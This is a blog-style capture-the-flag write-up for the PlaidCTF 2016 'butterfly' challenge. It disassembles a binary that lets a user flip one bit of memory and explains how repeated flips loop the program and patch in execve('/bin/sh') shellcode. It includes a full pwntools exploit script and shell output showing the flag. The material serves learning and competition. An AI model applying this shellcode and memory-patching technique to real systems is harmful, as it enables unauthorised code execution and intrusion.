---
layout: post
title: "PlaidCTF - butterfly"
date: 2016-04-18 02:00
categories: ctf exploit
---

Here is a solution to the second pwn challenge `butterfly`. This is not your usual buffer overflow, but rather a nice demonstration on how bit flips can be dangerous!
<!--more-->

# Basic information

From the organizers:

```
Pwnable (150 pts)

Sometimes the universe smiles upon you. And sometimes, well, you just have to roll your sleeves up and do things yourself. Running at butterfly.pwning.xxx:9999

Notes: The binary has been updated. Please download again if you have the old version. The only difference is that the new version (that's running on the server) has added setbuf(stdout, NULL); line.
```

We have an unstripped ELF 64-bit executable with stack canaries and NX enabled.

```
$ file butterfly
butterfly: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=daad8fa88bfeef757675864191b0b162f8977515, not stripped

$ checksec --file butterfly
RELRO           STACK CANARY      NX            PIE             RPATH
No RELRO        Canary found      NX enabled    No PIE          No RPATH
RUNPATH      FILE
No RUNPATH   butterfly
```

# Operation

There is only one function which is the `main`:

```
0x00400788      55             push rbp
0x00400789      4157           push r15
0x0040078b      4156           push r14
0x0040078d      53             push rbx
0x0040078e      4883ec48       sub rsp, 0x48
0x00400792      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x1888 ; '('
0x0040079b      4889442440     mov qword [rsp + 0x40], rax
; DATA XREF from 0x00600c79 (sym.main)
0x004007a0      488b3d790520.  mov rdi, qword [rip + 0x200579] ; [0x600d20:8]=0x654428203a434347 L
"GCC: (Debian 5.3.1-10) 5.3.1 20160224" @ 0x600d20
0x004007a7      31f6           xor esi, esi
0x004007a9      e872feffff     call sym.imp.setbuf
0x004007ae      bf14094000     mov edi, str.THOU_ART_GOD__WHITHER_CASTEST_THY_COSMIC_RAY_ ; "THOU
EST THY COSMIC RAY?" @ 0x400914
0x004007b3      e848feffff     call sym.imp.puts
; DATA XREF from 0x00600b71 (sym.main)
0x004007b8      488b15710520.  mov rdx, qword [rip + 0x200571] ; [0x600d30:8]=0x35202930312d312e L
.2.5 ; ".1-10) 5.3.1 20160224" @ 0x600d30
0x004007bf      488d3c24       lea rdi, qword [rsp]
0x004007c3      be32000000     mov esi, 0x32               ; '2'
0x004007c8      e873feffff     call sym.imp.fgets
0x004007cd      41be01000000   mov r14d, 1
0x004007d3      4885c0         test rax, rax
0x004007d6      7475           je 0x40084d
0x004007d8      488d3c24       lea rdi, qword [rsp]
0x004007dc      31f6           xor esi, esi
0x004007de      31d2           xor edx, edx
0x004007e0      e86bfeffff     call sym.imp.strtol
0x004007e5      4889c3         mov rbx, rax
0x004007e8      4889dd         mov rbp, rbx
0x004007eb      48c1fd03       sar rbp, 3
0x004007ef      4989ef         mov r15, rbp
0x004007f2      4981e700f0ff.  and r15, 0xfffffffffffff000
0x004007f9      be00100000     mov esi, 0x1000
0x004007fe      ba07000000     mov edx, 7
0x00400803      4c89ff         mov rdi, r15
0x00400806      e855feffff     call sym.imp.mprotect
0x0040080b      85c0           test eax, eax
0x0040080d      755c           jne 0x40086b
0x0040080f      80e307         and bl, 7
0x00400812      41be01000000   mov r14d, 1
0x00400818      b801000000     mov eax, 1
0x0040081d      88d9           mov cl, bl
0x0040081f      d3e0           shl eax, cl
; DATA XREF from 0x00000311 (sym.main)
0x00400821      0fb64d00       movzx ecx, byte [rbp]
0x00400825      31c1           xor ecx, eax
; DATA XREF from 0x00000311 (sym.main)
0x00400827      884d00         mov byte [rbp], cl
0x0040082a      be00100000     mov esi, 0x1000
0x0040082f      ba05000000     mov edx, 5
0x00400834      4c89ff         mov rdi, r15
0x00400837      e824feffff     call sym.imp.mprotect
0x0040083c      85c0           test eax, eax
0x0040083e      7537           jne 0x400877
0x00400840      bf56094000     mov edi, str.WAS_IT_WORTH_IT___ ; "WAS IT WORTH IT???" @ 0x400956
0x00400845      e8b6fdffff     call sym.imp.puts
0x0040084a      4531f6         xor r14d, r14d
; JMP XREF from 0x00400875 (sym.main)
; JMP XREF from 0x00400881 (sym.main)
0x0040084d      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x1888 ; '('
0x00400856      483b442440     cmp rax, qword [rsp + 0x40] ; [0x40:8]=0x500000006 ; '@'
0x0040085b      7526           jne 0x400883
0x0040085d      4489f0         mov eax, r14d
0x00400860      4883c448       add rsp, 0x48
0x00400864      5b             pop rbx
0x00400865      415e           pop r14
0x00400867      415f           pop r15
0x00400869      5d             pop rbp
0x0040086a      c3             ret
0x0040086b      bf42094000     mov edi, str.mprotect1      ; "mprotect1" @ 0x400942
0x00400870      e8fbfdffff     call sym.imp.perror
0x00400875      ebd6           jmp 0x40084d
0x00400877      bf4c094000     mov edi, str.mprotect2      ; "mprotect2" @ 0x40094c
0x0040087c      e8effdffff     call sym.imp.perror
0x00400881      ebca           jmp 0x40084d
0x00400883      e888fdffff     call sym.imp.__stack_chk_fail
```

The code is really simple and here what happens when everything goes right:

* it prints `THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?`

* reads 49 (0x32 - 1) characters from the standard input with [`fgets`][fgets]

* stores it as a `long` with [`strtol`][strtol]. Let's name it `input_val`. `strtol` takes a base as it third argument. Here `0` is passed which a special case where it will interpret either octal, decimal or hexadecimal values (cf the [manpage][strtol]).

* shifts right the value by 3 (divide it by 8). Let's name it `addr`
  `0x004007eb      48c1fd03       sar rbp, 3`

* align it to the beginning of the corresponding page
  `0x004007f2      4981e700f0ff.  and r15, 0xfffffffffffff000`

* calls [`mprotect`][mprotect] to activate read, write and execute permissions on the page

* keep the 3 lowest bits of `input_val`. Let's name it `bit_nr`
  `0x0040080f      80e307         and bl, 7`

* shifts left `1` by `bit_nr`. Let's name it `bit_flip`
  `0x00400818      b801000000     mov eax, 1`
  `0x0040081d      88d9           mov cl, bl`
  `0x0040081f      d3e0           shl eax, cl`

* At the address pointed by `addr` xor the bit number `bit_nr` with `bit_flip`
  `0x00400821      0fb64d00       movzx ecx, byte [rbp]`
  `0x00400825      31c1           xor ecx, eax`

Afterward, it calls `mprotect` on the same page to remove the write permission and asks if it was worth it before exiting.

It means that we can flip one bit anywhere in the memory (except in the kernel of course).

# Exploitation

Some followed the way of creating a buffer overflow on the stack. I chose another path. What if we can change an instruction to loop back at the beginning of the program with that single bit-flip? Then we would be able to flip more bits to craft a shellcode to execute a shell!

## Make it loop

Here is the second call to `mprotect` in GDB:
`0x0000000000400837 <+175>:	call   0x400660 <mprotect@plt>`

In [`radare2`][r2] we can see the hexadecimal representation of the instruction:
`0x00400837      e824feffff     call sym.imp.mprotect`

The `call` instruction is the opcode `e8` that takes a relative offset as argument ([source](http://ref.x86asm.net/coder64.html#xE8)). In that case, the offset is negative because it goes into the `PLT` section which is before the `.text`. By flipping a bit in the low bits part of the offset, we can reduce it and land in the `_start` function which is what is executed first when the binary is launched (the entry point of binary). 

Let's change the opcode from `e824feffff` to `e864feffff` and see the result with [`shellnoob`][shellnoob]:

```
$ shellnoob --64 --intel -i --to-asm
opcode_to_asm selected (type "quit" or ^C to end)
>> e824feffff
e824feffff ~> Disassembly of section .text:

0000000000000000 <.text>:
   0:	e8 24 fe ff ff       	call   0xfffffffffffffe29

>> e864feffff
e864feffff ~> Disassembly of section .text:

0000000000000000 <.text>:
   0:	e8 64 fe ff ff       	call   0xfffffffffffffe69
```
The address that we target is one byte after the start of the `call` instruction:
`0x400837 + 1 = 0x400838`

It has to be multiplied by 8:
`0x400838 * 8 = 0x20041c0`

Now we need to control which bit is flipped in the targeted byte. With the python interpreter:

```
>>> bin(0x24^0x64)
'0b1000000'
```

This is the sixth bit (we start at 0). If we send the number `0x20041c6` to the binary we should see the call change:

```
$ gdb -q butterfly
Reading symbols from butterfly...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/abe/ctf/plaidctf/butterfly/butterfly 
THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?
0x20041c6
THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?
^Z
Program received signal SIGTSTP, Stopped (user).
[snip]
gdb-peda$ x/i 0x400837
   0x400837 <main+175>:	call   0x4006a0 <_start+16>
```

## Insert shellcode here

Now that we can modify any other instruction, we can create a shellcode to execute a shell. It has to be done on instructions that are after the `call` that we modified to avoid executing a corrupted instruction in the process.

The shellcode will look like this:

```
xor rsi, rsi      ; zero out the argv pointer
mov rax, 59       ; set the syscall number
xor rdx, rdx      ; zero out the envp pointer
mov rdi, 0x400914 ; address of /bin/sh\
syscall
/bin/sh\0
```

`0x400914` is the location of the greeting message `THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?`

Back with `shellnoob`:

```
$ shellnoob --64 --intel -i --to-opcode
asm_to_opcode selected (type "quit" or ^C to end)
>> xor rsi, rsi; mov rax, 59; xor rdx, rdx; mov rdi, 0x400914; syscall
xor rsi, rsi; mov rax, 59; xor rdx, rdx; mov rdi, 0x400914; syscall
~> 4831f648c7c03b0000004831d248c7c7140940000f05
```

I chose to start at `0x40084a` because some bytes correspond:
`0x0040084a      4531f6         xor r14d, r14d`

Now either you go the long way and compute all the bit flips needed by hand or you code something.

# Payload

The script has to compute all the bit flips needed to change a portion of the existing instruction into the shellcode and the first 8 bytes of the greeting strings into `/bin/sh\0`. Once the bit flips for a certain byte are computed, we need to revert the algorithm that derives the address from the input and send a number for each flip needed inside the byte.

```
#!/usr/bin/env python2

from pwn import *

r = remote('butterfly.pwning.xxx', 9999)
#r = remote('localhost', 9999)

loop_val = '0x20041c6'
# Start the loop
r.sendline(loop_val)

# Generate the payload
start_addr = 0x40084a
shell_addr = 0x400914
shellcode = '4831f648c7c03b0000004831d248c7c7140940000f05'
text      = '4531f664488b042528000000483b44244075264489f0'
shell = ''.join('{:02x}'.format(ord(c)) for c in list('/bin/sh\0'))
greeting = 'THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?'[0:8]
greeting = ''.join('{:02x}'.format(ord(c)) for c in greeting)

# We need to parse it bytes after bytes
chunks_sc = [shellcode[i:i+2] for i in range(0, len(shellcode), 2)]
chunks_tx = [text[i:i+2] for i in range(0, len(text), 2)]

# loop over each byte
for i in range(0,len(chunks_tx)):
    # compute the flips needed
    flips = list('{:08b}'.format(int(chunks_tx[i],16) ^ int(chunks_sc[i], 16)))
    flips.reverse()
    indices = []
    # store the offsets of the flips in a table
    for j in range(0,len(flips)):
        if (flips[j] == '1'):
            indices.append(j)
    # for each flip send a corresponding number
    for n in indices:
        r.sendline('0x{:x}'.format((start_addr + i) * 8 + n))

#Same for the greeting and shell
chunks_sh = [shell[i:i+2] for i in range(0, len(shell), 2)]
chunks_gr = [greeting[i:i+2] for i in range(0, len(greeting), 2)]

for i in range(0,len(chunks_gr)):
    flips = list('{:08b}'.format(int(chunks_gr[i],16) ^ int(chunks_sh[i], 16)))
    flips.reverse()
    indices = []
    for j in range(0,len(flips)):
        if (flips[j] == '1'):
            indices.append(j)
    for n in indices:
        r.sendline('0x{:x}'.format((shell_addr + i) * 8 + n))

# Reset the call to mprotect
r.sendline(loop_val)
r.clean()
r.interactive()
```

Let's execute it:

```
$ ./payload.py 
[+] Opening connection to butterfly.pwning.xxx on port 9999: Done
[*] Switching to interactive mode 
THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?
[snip]
/bin/sh@ GOD, WHITHER CASTEST THY COSMIC RAY?
/bin/sh
WAS IT WORTH IT???
$ ls
butterfly
flag
wrapper
$ cat flag
PCTF{b1t_fl1ps_4r3_0P_r1t3}
$
```

Yup bit flips for the win!

[fgets]: http://man7.org/linux/man-pages/man3/fgets.3.html
[strtol]: http://man7.org/linux/man-pages/man3/strtol.3.html
[mprotect]: http://man7.org/linux/man-pages/man2/mprotect.2.html
[r2]: http://www.radare.org/r/
[shellnoob]: https://github.com/reyammer/shellnoob
